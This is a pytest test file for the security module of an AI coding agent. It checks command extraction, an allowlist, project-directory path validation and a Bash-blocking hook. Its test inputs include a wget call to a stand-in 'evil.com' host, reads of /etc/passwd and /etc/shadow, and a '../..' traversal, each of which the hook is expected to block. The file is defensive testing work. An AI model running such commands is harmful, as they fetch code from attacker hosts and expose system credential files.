"""Tests for the security module."""

import pytest

from coder.security import (
    extract_commands,
    _validate_paths,
    make_bash_security_hook,
    BASE_ALLOWED_COMMANDS,
)


# ── extract_commands tests (existing) ─────────────────────────────────────


def test_extract_simple_command():
    assert extract_commands("ls -la") == ["ls"]


def test_extract_piped_commands():
    assert extract_commands("grep foo | sort | uniq") == ["grep", "sort", "uniq"]


def test_extract_chained_commands():
    assert extract_commands("npm install && npm test") == ["npm", "npm"]


def test_extract_semicolon_commands():
    assert extract_commands("echo hello; ls") == ["echo", "ls"]


def test_extract_with_path():
    assert extract_commands("/usr/bin/python script.py") == ["python"]


def test_extract_with_env_var():
    assert extract_commands("NODE_ENV=test npm start") == ["npm"]


def test_blocked_command():
    """Commands not in allowlist should be detectable."""
    cmds = extract_commands("wget http://evil.com/malware")
    assert cmds == ["wget"]
    assert "wget" not in BASE_ALLOWED_COMMANDS


def test_allowed_command():
    cmds = extract_commands("git status")
    assert cmds == ["git"]
    assert "git" in BASE_ALLOWED_COMMANDS


# ── _validate_paths tests ─────────────────────────────────────────────────

PROJECT_DIR = "/home/user/project"


def test_path_within_project_dir():
    ok, _ = _validate_paths(f"cat {PROJECT_DIR}/src/main.py", PROJECT_DIR)
    assert ok is True


def test_path_outside_project_dir():
    ok, reason = _validate_paths("cat /etc/passwd", PROJECT_DIR)
    assert ok is False
    assert "outside project directory" in reason


def test_relative_path_within_project():
    ok, _ = _validate_paths("cat ./subdir/file.txt", PROJECT_DIR)
    assert ok is True


def test_dotdot_escape():
    ok, reason = _validate_paths("cat ../../etc/passwd", PROJECT_DIR)
    assert ok is False
    assert "outside project directory" in reason


def test_tmp_is_allowed():
    ok, _ = _validate_paths("cp file /tmp/staging", PROJECT_DIR)
    assert ok is True


def test_var_tmp_is_allowed():
    ok, _ = _validate_paths("cp file /var/tmp/out", PROJECT_DIR)
    assert ok is True


def test_dev_null_is_allowed():
    ok, _ = _validate_paths("echo hi > /dev/null", PROJECT_DIR)
    assert ok is True


def test_no_path_like_tokens():
    ok, _ = _validate_paths("ls -la", PROJECT_DIR)
    assert ok is True


def test_flags_are_skipped():
    ok, _ = _validate_paths("rm -f somefile", PROJECT_DIR)
    assert ok is True


def test_env_vars_are_skipped():
    ok, _ = _validate_paths("FOO=/bar echo hello", PROJECT_DIR)
    assert ok is True


def test_shlex_parse_error_returns_false():
    ok, reason = _validate_paths("cat 'unterminated", PROJECT_DIR)
    assert ok is False
    assert "Could not parse" in reason


def test_path_exactly_equals_project_dir():
    ok, _ = _validate_paths(f"ls {PROJECT_DIR}", PROJECT_DIR)
    assert ok is True


# ── make_bash_security_hook tests ─────────────────────────────────────────

ALLOWED = {"ls", "cat", "echo", "git"}


@pytest.mark.asyncio
async def test_hook_non_bash_tool_passes():
    hook = make_bash_security_hook(ALLOWED, PROJECT_DIR)
    result = await hook({"tool_name": "Read", "tool_input": {"path": "/etc/passwd"}})
    assert result == {}


@pytest.mark.asyncio
async def test_hook_empty_command_passes():
    hook = make_bash_security_hook(ALLOWED, PROJECT_DIR)
    result = await hook({"tool_name": "Bash", "tool_input": {"command": ""}})
    assert result == {}


@pytest.mark.asyncio
async def test_hook_allowed_command():
    hook = make_bash_security_hook(ALLOWED, PROJECT_DIR)
    result = await hook({"tool_name": "Bash", "tool_input": {"command": "ls -la"}})
    assert result == {}


@pytest.mark.asyncio
async def test_hook_blocked_command():
    hook = make_bash_security_hook(ALLOWED, PROJECT_DIR)
    result = await hook({"tool_name": "Bash", "tool_input": {"command": "wget http://evil.com"}})
    assert result.get("decision") == "block"


@pytest.mark.asyncio
async def test_hook_unparseable_command():
    hook = make_bash_security_hook(ALLOWED, PROJECT_DIR)
    result = await hook({"tool_name": "Bash", "tool_input": {"command": "'unterminated"}})
    assert result.get("decision") == "block"


@pytest.mark.asyncio
async def test_hook_path_restriction_blocks_outside():
    hook = make_bash_security_hook(ALLOWED, PROJECT_DIR)
    result = await hook({"tool_name": "Bash", "tool_input": {"command": "cat /etc/shadow"}})
    assert result.get("decision") == "block"


@pytest.mark.asyncio
async def test_hook_path_restriction_allows_inside():
    hook = make_bash_security_hook(ALLOWED, PROJECT_DIR)
    result = await hook({"tool_name": "Bash", "tool_input": {"command": f"cat {PROJECT_DIR}/README.md"}})
    assert result == {}


@pytest.mark.asyncio
async def test_hook_no_restriction_skips_path_check():
    hook = make_bash_security_hook(ALLOWED, None)
    result = await hook({"tool_name": "Bash", "tool_input": {"command": "cat /etc/passwd"}})
    assert result == {}
